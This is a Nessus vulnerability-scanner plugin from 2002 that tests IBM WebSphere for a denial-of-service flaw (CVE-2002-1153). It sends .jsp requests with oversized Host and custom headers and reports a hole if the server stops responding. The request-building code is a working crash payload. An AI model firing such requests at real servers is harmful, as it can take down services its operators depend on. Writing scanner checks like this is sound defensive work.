#
# This script was written by Michel Arboi <arboi@alussinan.org>
# GPL
# *untested*
#
################
# References...
################
#
# From:"Peter_Gründl" <pgrundl@kpmg.dk>
# To:"Full-Disclosure (netsys)" <full-disclosure@lists.netsys.com>
# Subject: KPMG-2002035: IBM Websphere Large Header DoS 
# Date: Thu, 19 Sep 2002 10:51:07 +0200
#

if(description)
{
 script_id(11181);
 script_bugtraq_id(5749);
 script_version ("$Revision: 1.9 $");
 script_cve_id("CVE-2002-1153");

 name["english"] = "WebSphere Host header overflow";
 script_name(english:name["english"]);
 
 desc["english"] = "It was possible to kill the WebSphere server by
sending an invalid request for a .jsp with a too long Host: header.

A cracker may exploit this vulnerability to make your web server
crash continually.

Solution : Install PQ62144
Risk factor : High";

 script_description(english:desc["english"]);
 
 summary["english"] = "Too long HTTP header kills WebSphere";
 script_summary(english:summary["english"]);
 
 script_category(ACT_DENIAL);
 
 script_copyright(english:"This script is Copyright (C) 2002 Michel Arboi");
 family["english"] = "Denial of Service";
 family["francais"] = "Déni de service";
 script_family(english:family["english"], francais:family["francais"]);
 script_require_ports("Services/www", 80);
 script_dependencie("find_service.nes", "httpver.nasl", "http_version.nasl");
 script_require_keys("www/ibm-http");
 exit(0);
}

########

include("http_func.inc");


port = get_http_port(default:80);

if(! get_port_state(port)) exit(0);
if (http_is_dead(port: port)) exit(0);

soc = http_open_socket(port);
if(! soc) exit(0);

#
r1 = string("GET /foo.jsp HTTP/1.1\r\n Host: ", crap(1000), "\r\n\r\n");

send(socket:soc, data: r1);
r = http_recv(socket:soc);
http_close_socket(soc);

#
r2 = http_get(item:"/bar.jsp", port:port);
r2 = r2 - string("\r\n\r\n");
r2 = string(r2, "\r\n", "Nessus-Header: ", crap(5000), "\r\n\r\n");

soc = http_open_socket(port);
if (! soc)  { security_hole(port); exit(0); }

send(socket:soc, data: r2);
r = http_recv(socket:soc);
http_close_socket(soc);
#

if (http_is_dead(port: port)) { security_hole(port); exit(0); }
